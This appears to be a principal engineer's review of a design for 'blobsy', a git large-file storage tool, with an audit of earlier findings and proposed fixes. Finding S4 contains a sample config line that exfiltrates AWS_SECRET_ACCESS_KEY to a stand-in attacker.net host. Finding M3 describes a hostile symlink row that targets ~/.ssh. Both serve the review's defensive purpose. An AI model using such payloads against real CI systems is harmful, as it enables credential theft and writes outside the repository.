# Blobsy design v3 (revised 2026-10-23): final senior review

**Reviewer stance:** principal engineer, read-only pass over `blobsy-design.md`
(revised), `plan-2026-10-22-blobsy-v3-redesign.md`, `blobsy-threat-model.md`, the four
v3 reviews (`v3-reviews/{simplicity,flexibility,usability,data-safety}.md`) and the Gat
research. Experiments in `scratchpad/exp-undef-driver/` and `scratchpad/exp-inner/` (git
2.43). Severity: **must-fix** = loses bytes, bricks a name/ref, or breaks a stated
safety promise in an ordinary workflow; **should-fix** = two implementers diverge with
safety or usability consequences, or a hole the owner will hit early; **consider** =
polish.

## Headline verdict

The rewrite is a genuine convergence.
Of the ~130 review items, all 29 must-level items are resolved (two of them differently,
with sound justification), and only a handful of should-items were dropped, none of
which matter except F33 (publish must hash and pack in one pass).
The model is now Gat-shaped — one storage contract, one manifest format, one entry loop
— with blobsy’s extra flexibility carried by exactly two additions (directory refs;
snapshots as store-side manifests).
That is the right place to be.

What remains is a thin layer of gaps in the *new* mechanisms, which no prior review saw:

1. **Bytes that live only inside a packed archive are never “recoverable” by the §11.2
   online check** (per-object `exists` fails for `pack` rows).
   `pull` of an updated *packed* pin, and `clean` of its target, therefore refuse every
   file. Must-fix, one paragraph.
2. **`clean` leaves the hash cache’s `here` flag set**, so `add --prune` after `clean`
   drops every cleaned entry from the ref and the next `gc` deletes the objects.
   Must-fix, one sentence.
3. **Symlink targets are outside `tree_id`** (storage column) and nothing says restore
   verifies `hash(target)`; a tampered store manifest passes the pin check with a
   hostile link target.
   Must-fix, one sentence.
4. **The inner merge driver’s “omit conflicting paths” rule hides modify/delete
   conflicts** (reproduced: a deleted row silently comes back as a clean merge).
   Emitting the *base* row instead surfaces it.
   Should-fix, verified.
5. **`${VAR}` and `{env:NAME}` read arbitrary environment variables from an untrusted
   file** (`.blobsy.yml`), which lets a committed config exfiltrate
   `AWS_SECRET_ACCESS_KEY` via an `https://` host or a snapshot name.
   Should-fix; simplest fix is to cut `${VAR}` (it duplicates `backendOverride`) and
   restrict `{env:}` to `BLOBSY_*`.
6. **Store identity excludes the endpoint** while `?endpoint=` is allowed in the URL, so
   two S3-compatible hosts with the same bucket name share one known log.
7. **`_blobsy/repos/` is written only by first-run `setup`**, so forks and hand-edited
   clones never register and `gc`’s sharing check cannot see them.

Everything else is specification tightening and a short simplicity list (cut `${VAR}`,
`--rehash`, `--atomic`, the stanza `fallback:` key, `blobsy.endpoint`, `setup --jj`, and
the second store version number).
Details follow.

* * *

## 1. Coverage audit

Status: **R** resolved as proposed · **RD** resolved differently (justified) · **P**
partially resolved (gap named) · **D** dropped · **n/a** superseded by another change.
Only must/should items and the considers that were adopted or matter are listed; the
rest of the considers were either adopted trivially or are judgment calls the design
reasonably declined.

### Simplicity review

| Item | Sev | Status | Design § | Note |
| --- | --- | --- | --- | --- |
| 1 `hydrate.fetch` network in hooks | must | R | §10, §4 p8 | auto-pull = `pull --offline --quiet` |
| 2 one manifest format in store | must | R | §5.4 | `snap/<name>/manifest.bref`, `#key value` lines, create-only last |
| 3 fifth column = `storage` | must | R | §5.1 | one definition; `kind` one char |
| 4 assets not forced into one tar | must | R | §5.4 | packed vs files mode per snapshot |
| 5 delete `sync` | should | R | §7.1 |  |
| 6 `rm` never deletes bytes | should | R | §7.1, K9 |  |
| 7 delete `--each`/`externalize` | should | R | §7.2 | refusal names `add data/*.parquet` |
| 8 per-path vs per-hash caches | should | RD | §5.6 | `.known` marker → known log per store (shared); `here` flag added. **Gap left open:** the review’s note that pack-only bytes never satisfy (c) is not addressed → finding M1 below |
| 9 no `cache` cmd, no `cache.on_add` | should | P | §7.1, §12 | `cache` → `clean --cache`; `cacheOnAdd` kept as an escape (F25). Fine |
| 10 two config scopes, git config | should | R | §12 |  |
| 11 merge `?` into `↑` | should | R | §11.1 |  |
| 12 static header | should | R | §5.2 |  |
| 13 positional = path; one `--only` | should | R | §7.1 |  |
| 14 `l`/`d` everywhere | should | R | §5.1, §7.2 |  |
| 15 defer `mv`,`diff`; drop `snap show`,`--keys` | should | RD | §7.1 | `diff` kept for PR comments (usability 25); rest done |
| 16 delete `gitignore.ts` | should | R | plan P1 |  |
| 17 dir refs in P1; no K3 gate | should | R | plan, K3 |  |
| 18 write the names-vs-CAS trade-off | consider | P | §5.4 | archive-by-`tree_id` rationale is written; the “names as pointers” alternative is not. Add two sentences |
| 22 `.` row rule | consider | P | §5.1 | “sole row” stated; kinds not restricted → `t`/`.` with kind `d`/`l` undefined; see S9 |
| 24 `fallback:` flag only | consider | D | §8.4, §7.1 | both a stanza key and a flag survive; see simplicity list |

### Flexibility review

| Item | Sev | Status | Design § | Note |
| --- | --- | --- | --- | --- |
| M1 store identity in synced records | must | P | §5.6 | store-id **excludes endpoint**; see S5 |
| M2 one prefix per repo / gc peers | must | P | inv 7, §16, §5.3 | marker only on first-run `setup`; see S6 |
| M3 cache fill in Phase 1 | must | R | plan P1 |  |
| S1 sparse + persistent working set | should | R | §8.3, plan P2 | glob base inconsistent; see C-list |
| S2 `https://` read-only | should | R | §13 |  |
| S3 `${VAR}` + per-permission probes | should | R | §12, §13 | introduces the exfiltration hole; see S4 |
| S4 materialize list, hardlink opt-in | should | R | §5.6 |  |
| S5 single binary in P1 | should | RD | §14, plan P1 | built and golden-tested in P1, released when green |
| S6 Windows | should | R | §14 |  |
| S7 torn-read | should | R | §5.5 |  |
| S8 pins as cross-repo mechanism | should | R | §8.5 UC-9 | cross-store pins deferred §19 |
| S9 server-side SHA-256 checksum | should | D | §5.5 K3 | recorded as a K3 trade-off; no command uses it. Acceptable drop |
| S10 emergency purge | should | R | §16 |  |
| S11 repo lock | should | R | §5.6 |  |
| S12 conditional deletes | should | R | §16 |  |
| S13 jj-aware `add`; recursive driver | should | R | §7.2, §8.9, §9 |  |
| §5.8 partial restore downloads whole archive | gap | D | §8.4 | one sentence missing; see C-list |
| §5.9 monorepo recipe | gap | P | §8.3 | sparse-checkout honored; `--filter=blob:none` recipe absent (fine) |

### Usability review

| Item | Sev | Status | Design § | Note |
| --- | --- | --- | --- | --- |
| 1 install story; hooks when absent | must | R | §14, §10 |  |
| 2 hasher visibility; `--hash` at setup | must | R | §5.5, §7.1 | “`setup` refuses `--hash` on existing config” not stated (minor) |
| 3 read-only `doctor --ci` | must | R | §13, §7.1 |  |
| 4 `setup` join vs first run | must | R | §4 p2, §7.1 | one-time “hooks absent” hint dropped (fine) |
| 5 credentials | should | R | §13, §8.8 |  |
| 6 golden path | should | R | §8.1 |  |
| 7 `add <dir>` refuses tracked | must | R | §7.2 |  |
| 8 `--prune` only materialized-here | must | R | §7.2 | **`clean` breaks it**; see M2 |
| 9 `rm` keeps | should | R | §7.1 |  |
| 10 stale vs modified; `--force` last | must | R | §11.1, §7.3 |  |
| 11 `↑`/`?`; deleted state | should | RD | §11.1 | `deleted` folded into `absent` + `here` flag |
| 12 JSON/error/plan schema | must | R | §7.3 | codes missing for name-taken, pin mismatch, config; see C-list |
| 13 partial success | should | R | §7.3 |  |
| 14 path semantics | should | R | §7.1 |  |
| 15 gitignore placement, `eol=lf` | must | R | §5.2 |  |
| 16 persisted `--include` | should | R | §8.3, §12 |  |
| 17 `resolve` on file ref; status exit 2 | should | R | §9, §11.1 |  |
| 18 big-upload message | should | R | §8.7 |  |
| 20 miss exits 0 | must | P | §8.4 | stated for stanzas; `--name`/`--latest` miss exit undefined; see C-list |
| 21 `snap` positional ambiguity; `{os}`/`{arch}` | should | R | §7.1, §5.4 |  |
| 22 `add` on pin refuses; pre-push verifies pins | must | R | §7.2, §8.5, §10 |  |
| 23 stash/reset behaviour | should | R | §8.7 |  |
| 24 CI recipe, write segregation | must | R | §8.8 | IAM sketch omits `_blobsy/*` for the repos marker |
| 25 PR diff, `diff --markdown` | should | R | §7.1, §8.2 |  |
| 26 jj section | should | R | §8.9 |  |
| 27 Windows | should | R | §14 |  |
| 28 shared prefix / gc | must | P | §16 | see S6 |
| 29 LFS overlap | should | R | §7.2 |  |
| 30 backend override scoping | must | P | §12 | `blobsy.endpoint` machine key vs `?endpoint=` in URL contradict; see S5 |
| 31 skill rewrite | must | R | §8.10, plan | plan cites the review’s draft, which still names deleted verbs; adapt |
| 32 `--dry-run` refusals | should | R | §7.3, §8.10 |  |
| 34 flag names | should | R | §7.1 |  |
| 35 minimal `.blobsy.yml` | should | R | §12 |  |
| 37 moving the store | should | R | §8.11 |  |
| 38 history removal recipe | should | R | §8.11, §16 |  |
| 39 offline paragraph | should | P | §4 p8, §11.2 | adequate |
| 40 zero-credential first try | should | R | §8.1 |  |
| 41 `clean` | should | R | §7.1 | see M2, S2 |
| 43 lock | consider | R | §5.6 |  |
| 44 interrupted swap | consider | R | §8.4 |  |
| 45 layout version | consider | R | §5.3 | two version fields; see simplicity |

### Data-safety review

| Item | Sev | Status | Design § | Note |
| --- | --- | --- | --- | --- |
| F1 (a) trusts stale record | must | R | §11.2, §5.6 | displace + online `exists`; known log per store |
| F2 prune deletes only copy | must | R | §5.6 |  |
| F3 presence ≠ bytes | should | R | §5.3, §13 |  |
| F5 `--prune` after partial pull | should | R | §7.2 |  |
| F6 `rm` on dir ref | should | n/a |  | `rm` keeps files |
| F7 shape change, symlink at target | consider | R | §11.2 |  |
| F8 mutable upload poisons key | must | R | §5.3 |  |
| F9 algorithm per ref | should | R | §5.5 |  |
| F10 both encodings | should | R | §5.3, §9 |  |
| F11 decompression bound | consider | R | §5.3 | `doctor --ci --deep` dropped; no command finds a corrupt remote object before a `pull` fails. Acceptable |
| F12 benign LWW | consider | R | §5.3 |  |
| F13 atomic local/command put | must | R | §5.3 | Windows “O_EXCL + rename” is not create-only; see C-list |
| F14 `push --repair` | should | R | inv 1, §7.1 |  |
| F15 racy-clean clock domain | consider | R | §5.5 |  |
| F16 criss-cross | must | R | §9 | inner driver; **modify/delete hidden**, see S1 |
| F17 merge-created overlap | should | R | §9, inv 3 |  |
| F18 rename detection, escaped payload | should | R | §9, §10 |  |
| F19 escaping/sorting | should | R | §5.1 |  |
| F20 header mismatch | should | R | §9 |  |
| F21 remaining merge cases | consider | P | §9 | empty body validity and shape-change not stated |
| F23 `↑` vs `?` | should | R | §11.1 |  |
| F24 enumerate every blob | should | R | §10 |  |
| F25 bytes of intermediate versions | should | R | §5.6 |  |
| F26 payload check vs merge commits | should | R | §10 |  |
| F27 large-file allow, `--range` | should | R | §10, §8.8 |  |
| F29 publish race | must | RD | §5.4 | archive keyed by `tree_id`, manifest create-only: simpler than the proposed layout and equally sound. `--name` loser semantics unstated; see S7 |
| F30 restore guard | must | R | §8.4 |  |
| F31 extraction hardening | must | P | §8.4 | stated for packed restore only; `l` rows via `pull`/files-mode restore not covered; see M3 |
| F32 manifest outlives archive | should | R | §8.4 |  |
| **F33 hash and pack in one pass** | **should** | **D** | §8.6 | **dropped**; a tree modified during a packed publish yields a dead cache key. See S8 |
| F34 names, `{env}` unset | consider | R | §5.4 |  |
| F35 `--only` not atomic; pin status | consider | P | §7.1 | pin status after `--only` undefined; see S3 |
| F36 corrupt cache archive evicts | consider | R | §5.6 |  |
| F37 gc clone-local | must | R | §16 |  |
| F38 dedup defeats grace | should | R | §16 | documented gap |
| F40 verify on materialize | should | R | §5.6 |  |
| F41 shared known logs | consider | R | §5.6 |  |
| F42 jj root | consider | R | §7.2, §8.9 |  |
| F43 symlinks/special files in `add` | should | R | §7.2 | Windows mode-bit rule dropped (minor) |
| F44 threat model | should | R | threat model | new `${VAR}` surface unaddressed; see S4 |

**Drops that matter:** F33 only.
Everything else dropped is polish.

* * *

## 2. Findings

Each finding names the section, gives a step-by-step scenario, and proposes the smallest
replacement text that closes the hole.

### Must-fix

#### M1. Bytes that exist only inside a packed archive are never “recoverable” — §11.2, §5.4, §7.1 `clean`

**Scenario.**
1. `blobsy snap publish fixtures --name assets/fixtures/v1 --packed --pin` (15k tiny
   files; packed is exactly what §8.6 recommends for this shape).
   Commit the pin.
2. A teammate runs `blobsy pull fixtures`: the archive is fetched, 15k files extracted.
   None of those files has a content object under `<algo>/`; their bytes exist only
   inside `snap/assets/fixtures/v1/<tree_id>.tar.zst`.
3. `v2` is published and pinned.
   The teammate runs `git pull && blobsy pull`.
4. §11.2 step 1 (online) asks whether each current file’s bytes are recoverable: “the
   store holds them (batched `exists` under either encoding)”. `exists` on
   `<algo>/…/<hash>` is false for all 15k files.
   Offline, the known log only lists hashes “pushed to or pulled from” the store, and
   nothing says a packed restore appends to it.
5. Result: 15k `E_MODIFIED` refusals, exit 2, and the only listed way forward is
   `pull --force` on a tree the user never touched.
   `clean fixtures/` refuses the same way.
   The same happens when a files-mode snapshot replaces a tree restored from a packed
   one.

Idea 3 in §1 ("the store … proves the bytes can come back") is true here — the store
does hold the bytes, inside the archive — but the rule as written can’t see it.
The simplicity review’s item 8 named this gap ("files inside a packed snapshot have no
per-file object, so (c) can never apply") and the rewrite did not pick it up.

**Fix (two sentences in §11.2 step 1, one in §5.6).**
- §11.2, after the online/offline bullets: *“A file placed by `pull` or `snap restore`
  from a snapshot manifest is also recoverable while that manifest still exists in the
  store (online: one `exists` on `snap/<name>/manifest.bref` per target) or its archive
  is in the content cache (offline).
  The hash cache records, per target, the name and `tree_id` the tree was last placed
  from, and per path whether it still matches that manifest’s row.”*
- §5.6 hash-cache row: add *“and, per target, the snapshot name and `tree_id` it was
  last restored from”*.

Alternative that avoids the extra state: forbid `--pin` on packed snapshots and have
`clean` refuse packed stanza targets.
That gives up UC-5 for tiny-file assets, so the sentence above is the better trade.

#### M2. `clean` leaves `here` set, so `add --prune` then drops every cleaned entry — §7.1 `clean`, §7.2 `--prune`

**Scenario.**
1. `blobsy pull data/images` (10k files; the hash cache marks each `here`).
2. Disk is tight: `blobsy clean data/images`. Files are deleted; the design says nothing
   about the hash cache.
3. A week later the user deletes 12 obsolete images in another checkout and runs
   `blobsy add --prune data/images` here, as §8.3 teaches.
   §7.2: `--prune` “drops entries only if the hash cache marks them `here` and they are
   now gone” — which is now every entry.
4. The ref shrinks to zero rows, the commit is pushed, 30 days later `gc` deletes the
   objects.

**Fix.** §7.1 `clean` row, append: *“Clears the `here` mark for every file it removes,
so `add --prune` and `status` treat them as never materialized (`↓ absent`).”* Also
state the same for files removed by `pull`/`snap restore` as “extra files” (§8.6).

#### M3. Symlink targets are outside `tree_id` and are never verified or confined on placement — §5.1, §8.4, §8.6, §11.2, threat model rule 4

`tree_id` covers `path kind size hash`; for an `l` row the *target* lives in `storage`,
which is excluded. The hash column is `hash(target)`, but no sentence says a reader
checks it. Hardening of link targets (absolute, `..`) is stated only for tar extraction
in §8.4 step 3. `l` rows reach disk by two other routes: `pull` of a directory ref (a
`.bref` is untrusted per the threat model) and files-mode `snap restore`/pinned `pull`.

**Scenario.**
1. A cache snapshot’s manifest (no pin, writer trusted only by credentials) or a `.bref`
   on a feature branch carries `bin/x	l	9	<hash("../lib/x")>	/home/ci/.ssh` — hash of a
   benign string, hostile target.
   `tree_id` verifies.
2. Files-mode restore creates the link.
   Nothing checks `hash(target)`, and the `..`/absolute rule applies to tar entries
   only.
3. `cargo build` (or any tool) writes through `bin/x` into the user’s home.
   Classic tar-slip impact, via the manifest instead of the tar.

A second inconsistency: `add` refuses links “pointing outside” the directory (resolution
semantics), while §8.4 rejects any target “that contains `..`” (lexical).
Real trees (`node_modules/.bin/foo -> ../pkg/bin/foo`, cargo `target/`) contain `..`
links that stay inside; the packed restore of such a tree would fail.

**Fix.** Make it one format rule in §5.1, and delete the duplicate from §8.4 step 3: *“A
symlink target is relative and, resolved lexically against the link’s own directory,
stays inside the manifest’s target (no absolute target, no escape through `..`). The
validator, `parseManifest()` and tar extraction all enforce this.
Before a link is created, `hash(target)` is compared with the row’s hash.”* Threat model
rule 4, add: *“Link targets are confined and hash-checked whether they come from a ref,
a store manifest or an archive.”*

#### M4. `_blobsy/repos/` only sees repositories that ran first-run `setup`, so invariant 7’s “is detected” is false — §5.3, §6 inv 7, §16 precondition 4

**Scenario.**
1. Repo A runs `setup s3://bucket/p` → `_blobsy/repos/<idA>.yaml`.
2. Repo B is a fork of A (or a new repo whose author copied `.blobsy.yml`). It never has
   a “first run”: `.blobsy.yml` exists, so `setup` is a *join* that “touches only the
   git dir”. B pushes objects for a year.
3. A’s operator runs `gc`. Precondition 4: `_blobsy/repos/` lists only A → passes.
   Every object only B references, older than 30 days, is deleted.
   The recovery window (if configured) is the only backstop.

**Fix.** §5.3: *“`_blobsy/repos/<id>.yaml` is written create-only by every command that
has write credentials (`setup` first run or join, `push`, `snap publish`) when absent.
`<id>` is a short hash of the normalized `origin` URL (fallback: the root commit), and
the file holds that URL so `gc` can print the exact `--also-repo` to pass.”* §16
precondition 4, append: *“An empty `_blobsy/repos/` refuses too.
The marker detects cooperating repositories, not hostile ones; the recovery window is
the real backstop.”* IAM sketch (§8.8): contributors need `PutObject` on
`_blobsy/repos/*`.

### Should-fix

#### S1. The inner merge driver hides modify/delete conflicts; emit the base row instead of omitting — §9 (verified)

**Experiment** (`scratchpad/exp-inner/`, git 2.43, toy per-path driver with
`merge.blobsy.recursive = blobsy-inner`, two real merge bases): base `a b c`; x changes
`c→cX`; y deletes `c`; each merges the other, resolving oppositely; x adds `d`, y adds
`e`; x merges y.
- Design rule (*omit every conflicting path*): the virtual ancestor lacks `c`; in the
  outer merge `c=cX` is “added on ours” → **clean merge, `c` resurrected on y’s side, no
  conflict**. The design’s claim “no conflict is hidden” is false for this case.
- Alternative (*emit the base row for a conflicting path that has one; omit only add/add
  conflicts*): outer sees base `c0`, ours `cX`, theirs absent → **modify/delete conflict
  surfaced**; `d` and `e` both kept.
- Both variants give the identical, correct answer on the original F16 scenario (both
  sides modify `c`): one marked `c`, `d` and `e` kept.

The base-row variant is never worse and is one line of code.

**Fix.** §9 criss-cross paragraph, replace “The inner merge omits every conflicting path
and exits 0” with: *“For each conflicting path the inner merge writes the base row when
one exists and nothing when it is an add/add conflict, then exits 0. Both sides then
appear changed (or one deleted) against the virtual ancestor, so the real merge reports
the conflict; no marker reaches a parser and no clean row is lost.”* Also add: *“If an
inner merge input is unparsable or the headers differ, the inner driver writes the
header only and exits 0 (never markers, never exit 1); every row then becomes add/add in
the real merge.”* And for `resolve`: *“A stage-1 (base) blob that fails to parse is
treated as absent.”*

#### S2. `clean --offline` exists in §11.2 but not in §7.1, and would reintroduce F1 — §11.2 last paragraph, §7.1

§11.2: “`clean` … deletes without displacing, and it requires the online check unless
given `--offline`.” §7.1 `clean` has no `--offline`. Deleting without a displaced copy
on the strength of the known log is exactly the stale-evidence case F1 closed (gc’d
object, lifecycle, store switch).
**Fix.** Replace the sentence with: *“`clean` frees disk, so it deletes without
displacing. It is therefore online-only: it refuses (`E_OFFLINE`) when the store is
unreachable.”*

#### S3. Pin state is undefined without a local copy of the store manifest — §5.6, §11.1, §8.5, F35

`status` prints `models/llama-3-8b.bref  pin  … ✓ ok` and `--verify walks the tree`, but
a pin row is one `t` entry and the manifest it names lives in the store.
Offline `status`, auto-pull of a pin, and `pull --only` on a pin all need the manifest
locally, and §5.6 caches only archives (`snap/<tree_id>`). The hash cache is “one file
per ref”, yet files-mode restore of a stanza or `--name` target (no ref) needs one too.

**Fix.** §5.6 content-cache row: *“… packed snapshot archives under
`snap/<tree_id>.tar.zst` and every store manifest read, under `snap/<tree_id>.bref`”*;
hash-cache row: *“one file per target (ref target or snapshot path)”*. §11.1, add after
the table: *“A pin’s state is the worst state of its manifest’s rows: `ok` when every
row matches, `stale`/`modified` per the rows, `absent` when no row is materialized or
the manifest is not cached.
After `pull --only`, rows outside the working set are `absent` and the pin is reported
as `partial (N of M)`.”*

#### S4. `${VAR}` and `{env:NAME}` let an untrusted file read any environment variable — §12, §5.4, threat model

The threat model classes `.blobsy.yml` as untrusted (anyone who can commit).
Both interpolations read arbitrary variables from it.

**Scenario.**
1. A PR edits `.blobsy.yml`:
   `backend: https://${AWS_SECRET_ACCESS_KEY}.x.attacker.net/p`.
2. CI (or a reviewer who checks out the branch) runs `blobsy pull`, `status --remote` or
   `doctor --ci`. The `https://` backend issues a GET/HEAD; the secret leaves via DNS
   and TLS SNI before any object is checked.
3. Variant: a stanza `name: "cache/{env:AWS_SECRET_ACCESS_KEY}/…"` writes the secret
   into a key name on `snap publish` from main (listable by every reader).

**Fix (simplest).** Delete `${VAR}` from §12: `blobsy.backendOverride` already serves
per-environment buckets and replicas, is machine-owned, and is reported loudly.
§5.4 `{env:NAME}`: *“only names beginning with `BLOBSY_`”* (CI sets `BLOBSY_BRANCH=…`).
Threat model, new rule 10: *“Repository content never selects which environment
variables are read. Interpolation in project config is limited to `BLOBSY_*` names.”* If
`${VAR}` is kept, apply the same `BLOBSY_*` limit to it.

#### S5. Store identity excludes the endpoint; `blobsy.endpoint` contradicts `?endpoint=` — §5.6, §12, §13

§5.6: store-id “excludes credentials, profiles and endpoints”.
§13 allows `s3://bucket/prefix?region=…&endpoint=…`; §12 lists `blobsy.endpoint` as a
machine key. **Scenario.** A developer’s `backendOverride` is
`s3://data/p?endpoint=https://minio.local` (scratch); the project backend is
`s3://data/p` on AWS (same bucket name, as teams do).
Both canonicalize to one store-id.
Objects pushed to MinIO are “known” for AWS; `pull` replaces local bytes whose only
copies are on the laptop’s MinIO. F1 again, by the back door.
**Fix.** §5.6: *“store-id is a short hash of scheme, endpoint or host, bucket and
prefix; it excludes only credentials and profile.”* §12: delete `blobsy.endpoint` (an
endpoint is a location, so it belongs in the URL); keep `blobsy.profile`.

#### S6. `backendOverride` inside hooks defeats the pre-push guard — §12, §10

**Scenario.** A laptop sets `backendOverride` to a scratch bucket.
`git push` → the pre-push hook uploads to the scratch bucket and lets the push through.
The ref reaches `origin`; no teammate can pull; `doctor --ci` is the first to notice.
**Fix.** §12 `backendOverride` row, append: *“Hooks and `doctor --ci` ignore it and
always use the project backend; it applies only to commands the user runs.”* (For UC-8
this still works: maintainers `blobsy push` through the override to S3, and the pre-push
hook’s `exists` against the public `https://` backend then finds the objects.)

#### S7. `snap publish --name` when the name already holds a different tree — §5.4, §8.4, §7.3

“Already published exits 0 if another job won” is right for caches and wrong for
`--name --pin`: the publisher must not write a pin for *its* tree when the name holds
another, and the user must learn the name is taken.
**Fix.** §5.4 after “Names are write-once”: *“On a 412 (or an existing manifest on
exists-then-put backends) the publisher reads the winner’s `#tree`. Equal → success.
Different → caches exit 0 with `result: lost-race`; `--name` publishes fail with
`E_NAME_TAKEN` and write no pin.
The loser’s archive is an orphan for `gc`.”* Add `E_NAME_TAKEN` to §7.3.

#### S8. Packed publish must hash and pack in one pass (F33, dropped) — §8.6, §5.4

`cargo build` still running, a file watcher, or an agent writing results while
`snap publish` runs: the walk hashes `x`, the tar later reads a newer `x`. The manifest
and archive disagree; every restore fails verification; the name is dead until lifecycle
expiry (for `--name` assets, forever).
§5.3’s upload-from-cache rule protects files-mode rows only.
**Fix.** §5.4 archive bullet, append: *“Each `pack` row’s hash is computed from the
bytes written into the archive, and `tree_id` after packing.
A file that changes between the walk and the pack is re-hashed, not re-read.”*

#### S9. `t` rows and the `.` row need a kind rule — §5.1, §5.2

Nothing forbids a `t` row inside a directory ref or a store manifest (a nested pin,
which would make restore recursive and `tree_id` depend on another snapshot), or a `.`
row of kind `d`/`l`. **Fix.** §5.1 table note: *“`t` appears only in a git ref, as the
sole `.` row. The `.` row has kind `f`, `x` or `t`. Store manifests never contain `t`.”*

#### S10. UC-6 without a pin leaves the directory unprotected from git, and incremental restore must skip `ignore`d paths — §8.6, §8.4

`snap publish data/results --name results/…` with “git holds nothing”: nothing ignores
`data/results/`, so `git add -A` commits thousands of files (the large-file guard
catches only files inside a *ref* target or over 5 MB). And files-mode restore “deletes
files not in the manifest”: with `ignore: ["**/incremental/**"]`, the ignored files are
not in the manifest and would be deleted.
**Fix.** §8.6 example: add `echo '/results/' >> data/.gitignore` and the sentence
*“`snap publish` without `--pin` refuses (`E_NOT_A_CACHE`) a path that git does not
ignore, and prints the line to add.”* §8.6 restore: *“Paths matching the stanza’s
`ignore` are neither compared nor deleted.”*

#### S11. `--only` glob base is inconsistent; `blobsy.only` is one key for many refs — §8.3, §8.8, §12

§8.3 uses `pull data/images --only 'cats/**'` (target-relative); §8.8 uses
`pull --only 'test-fixtures/**'` (repo-relative).
A single `blobsy.only` value cannot hold per-ref globs.
**Fix.** §7.1: *“`--only` globs are repo-root-relative.”* §8.3 example →
`--only 'data/images/cats/**'`. §12: *“`blobsy.only` is multi-valued
(`git config --add`).”*

#### S12. Surface vs text mismatches — §4 p8, §7.1, §7.3, §9, §16, §8.8, plan

- §4 principle 8 omits network users: add `status --remote`, `import lfs`, `setup`
  (probe) and `snap ls`.
- §7.1 is missing flags the text uses: globals `--fail-fast` (§7.3) and `--ascii`
  (§11.1); `snap restore --force` (§8.4); `gc --reflog`, `gc --no-recovery-window`
  (§16).
- §7.3 codes missing: `E_NAME_TAKEN` (S7), `E_PIN_MISMATCH` (pre-push pin check, §8.5),
  `E_CONFIG` (unknown key, unset variable).
- §9 table, “Managed ignore block: Not merged” — git text-merges `.gitignore`; the
  driver isn’t involved.
  Reword: *“Text-merged by git; a conflict is fixed by `doctor --fix`, which regenerates
  the block.”*
- §8.4/§7.1: miss exit code is defined for stanza restores only.
  Add: *“`--latest` miss exits 0; `--name <n>` miss exits 1 (a named asset must
  exist).”*
- §8.8 IAM: contributors and CI writers also need `PutObject` on `_blobsy/repos/*` (M4);
  first-run `setup` needs `_blobsy/*` and `DeleteObject` on `_blobsy/probe/*`.
- Plan Phase 1 ships `setup` writing `.gitattributes` (§7.1) but lists `.gitattributes`
  under Phase 2’s driver registration; `text eol=lf` is needed in Phase 1 for Windows.
  Move the file to Phase 1 (the `merge=blobsy` attribute is harmless without a driver —
  verified: git falls back to its text merge, `scratchpad/exp-undef-driver/`).
- Plan “Docs” cites the usability review’s SKILL draft, which still teaches
  `add --per-file`, `rm --delete`, `sync`, `mv`, `config`, `snap show`. Say “adapted”.
- Threat model rule 1 names `BLOBSY_TRUST_COMMAND_BACKEND=1`; the design (§12) has only
  the git-config key. Pick one and state it in both.

### Consider

- **C1. Displacement cost.** §11.2 displaces by rename, “else reflink or copy”.
  With `blobsy.cacheDir` on another filesystem, `pull` of a 16 GB pin update copies 16
  GB before replacing.
  Add: *“If the content cache already holds the hash, the file is deleted instead of
  displaced.”*
- **C2. Cache growth from unsynced displaced bytes.** Prune can never reach
  `cacheMaxSize` if the excess is unsynced.
  Say: *“When pruning cannot reach the target, `pull` prints the unsynced total and
  names `clean --cache --unsynced`.”*
- **C3. `--atomic` and displacement.** The swapped-out old tree is “deleted after
  success”; §11.2 requires displacement first.
  Either state per-file displacement or cut `--atomic` (see simplicity).
- **C4. Known-log refresh.** `status --remote` could drop hashes whose `exists` fails,
  so offline decisions stop trusting gc’d objects.
  One sentence, optional.
- **C5. Windows local backend.** “`O_EXCL` + rename” is not create-only (rename
  replaces). NTFS supports `link()`; use it, and say “rename only on filesystems without
  hard links, accepting last-writer-wins there (identical bytes)”.
- **C6. `gc --purge <name>`.** Define the tombstone key
  (`snap/<name>/manifest.bref.purged`) and say that “absent from HEAD” cannot see other
  repositories’ pins (UC-9).
- **C7. `{hash:<file>}`.** Say which hash: the configured algorithm over the
  working-tree bytes (not the git blob id), so it is pure and needs no git.
- **C8. “Looks like a tree id”** in §5.4 names: define as exactly 64 lowercase hex.
- **C9. Partial packed restore.** State that `snap restore --only` on a packed snapshot
  still downloads the whole archive (flexibility §5.8).
- **C10. Empty manifests and shape changes** (F21): say whether a zero-row directory ref
  is valid (recommend yes: an empty directory) and that file↔directory shape changes go
  through the ordinary per-path rules with `doctor --fix` adjusting the ignore line.
- **C11. Two store ids for one set of bytes.** UC-8 maintainers alternate between the
  committed `https://` backend and an `s3://` override; `↑ unsynced` flips with the
  override. Mention it under `backendOverride`.
- **C12. `.bref` sibling that is a tracked non-ref file** (data-safety §9): `add`
  refuses.
- **C13. Pre-commit payload check with pins.** Say the check skips `t` rows (nothing
  local to compare without the manifest), or compares the recorded `tree_id`.

* * *

## 3. Simplicity pass

The core is already minimal: four nouns (entry, ref, object, name), one format, one
entry loop, 16 commands.
Nothing below touches a use case in §3. Listed in order of concepts removed per line of
text changed.

| # | Cut or merge | Why it is safe | Where |
| --- | --- | --- | --- |
| 1 | **Cut `${VAR}` interpolation** | Duplicates `backendOverride` (per-environment buckets, replicas) and is the only place repo content reads the environment (S4). One mechanism for “a different store on this machine” instead of two. | §12 |
| 2 | **Cut `blobsy.endpoint`** | An endpoint is a location; it is already allowed in the URL (§13) and must be part of the store id (S5). One place for location, one for connection (`profile`). | §12 |
| 3 | **Keep one of stanza `fallback:` / flag `--fallback`** | Both exist (§8.4, §7.1). The stanza is the cache’s definition; keep the key, drop the flag. `--latest <prefix>` remains for ad-hoc restores. | §7.1, §8.4 |
| 4 | **Cut `add --rehash`** | `blobsy rm <t> && blobsy add <t>` recreates the ref with the configured algorithm and has the same “every entry present” requirement. Removes a flag and the only command that converts a ref in place. | §5.5, §7.1 |
| 5 | **Cut `snap restore --atomic`** | UC-6 is served by per-file atomic placement; `--atomic` adds a second swap path, a reflink/copy of unchanged files and an unresolved displacement question (C3). Defer with mirror mode. | §7.1, §8.6 |
| 6 | **Cut `setup --jj`** | `.jj/` presence already drives `add`’s behaviour (§7.2); `setup` can write the merge-tool stanza on the same detection. | §7.1, §8.9 |
| 7 | **One rule for “cache” semantics** | Today three things decide cache-ness independently: stanza-vs-`--name` (default mode, miss exit code), the `snap/cache/` prefix (lifecycle, IAM), and `--expire 'cache/**'`. Make the prefix the rule: *“A name under `cache/` is a cache: packed by default, miss exits 0, expirable. Anything else is an asset.”* Stanza names must then start with `cache/` (the example already does). | §5.4, §8.4 |
